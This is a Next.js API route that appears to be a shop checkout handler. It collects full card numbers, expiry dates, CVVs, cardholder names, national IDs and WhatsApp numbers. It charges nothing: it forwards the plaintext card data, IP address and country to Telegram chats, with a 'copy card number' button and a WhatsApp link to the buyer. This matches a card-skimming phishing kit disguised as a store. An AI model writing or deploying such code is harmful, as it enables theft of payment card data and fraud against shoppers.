import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;

  // جيب الـ IP والدولة
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
  let country = "غير معروف";
  const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
  if (!isLocal) {
    try {
      const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
      const geoData = await geo.json();
      if (geoData.country) country = geoData.country;
    } catch {}
  }
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  // حفظ في الداتابيز
  try {
    await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-forwarded-for": ip },
      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
    });
  } catch {}

  // Send Telegram
  const text = [
    `🛒 طلب لـ متجر مؤسسة مدار التقنية`,
    `🔖 رقم الطلب: #${orderId}`,
    ``,
    `💲 Total Amount: ${total} SAR`,
    ...(installmentType === "installment"
      ? [`🧾 First Payment: ${downPayment} SAR`]
      : [`🧾 Payment Type: Full Amount`]),
    ``,
    `🏦 MadaVisa - New Order`,
    `🌍 Country: ${country}`,
    `🌐 Public IP: ${ip || "غير معروف"}`,
    `🙍 Order For: ${customer ?? "-"}`,
    `📲 WhatsApp: ${whatsapp ?? "-"}`,
    `🪪 Card Number: ${cardNumber}`,
    `✍️ Card Holder: ${cardHolder}`,
    `📆 Valid To: ${expiry}`,
    `🔑 CVV: ${cvv}`,
  ].join("\n");

  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
  const reply_markup = {
    inline_keyboard: [
      [
        { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber } },
        ...(whatsappNum ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }] : []),
      ],
    ],
  };

  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? "").split(",").map(id => id.trim()).filter(Boolean);

  await Promise.all(
    chatIds.map(chat_id =>
      fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text, reply_markup }),
      })
    )
  );

  return NextResponse.json({ ok: true, orderId });
}
